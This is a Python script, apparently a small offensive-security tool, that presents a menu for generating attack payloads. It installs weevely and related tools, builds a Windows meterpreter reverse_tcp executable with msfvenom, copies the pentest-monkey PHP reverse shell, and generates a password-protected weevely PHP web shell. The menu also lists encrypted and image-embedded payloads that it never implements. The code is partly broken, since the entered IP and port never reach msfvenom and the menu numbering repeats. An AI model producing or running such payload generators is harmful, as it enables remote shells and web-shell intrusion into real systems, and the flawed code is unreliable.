import os
def banner():
        
        print ("""
        
        
               Targets are located , guns are reloaded
                    
 ______________|______________        
 |             |             |
 |             |             |
 |             |             |
 |             |             |
_|_________         _________|_
 |                           |
 |             |             |
 |             |             |
 |             |             |
 |_____________|_____________|        
               |                Created by ahmad shakla

=======>>   0.Exit
=======>>   1.Create an encrypted metasploit windows payload
=======>>   2.Create a php payload (pentest-monkey)
=======>>   3.Create a php payload with password
=======>>   3.Create a python payload
=======>>   4.Create a shell-script payload
=======>>   5.Create payloads injected with images
=======>>   6.Create encrypted payoads injected with images 
        
        
        """)
        trigger = input("TRIGGER >>")

       
def install():

        print("installing tools please wait...\n\n")
        os.system("apt-get update")
        os.system("clear")
        os.system("apt-get install exiftool")
        os.system("clear")
        os.system("apt-get install exe2hex")
        os.system("clear")
        os.system("apt-get install weevely")
        os.system("clear")
def metasploit_payload():
        
        os.system("echo Enter your ip : ;read ip; echo Enter your port : ;read port; msfvenom -p windows/meterpreter/reverse_tcp -o /root/payload.exe; clear; echo payload generated")
def php_payload():
        
        os.system("cp /usr/share/webshells/php/php-reverse-shell /root/php-payload.php; clear; echo pentest-monkey php payload is now in your /root directory")

def php_payload_with_password():
        os.system("echo Enter your password : ;read password; weevely generate ${password} /root/php-payload-passwd.php; clear; echo weevey payload is now in your /root directory")

install()
banner()
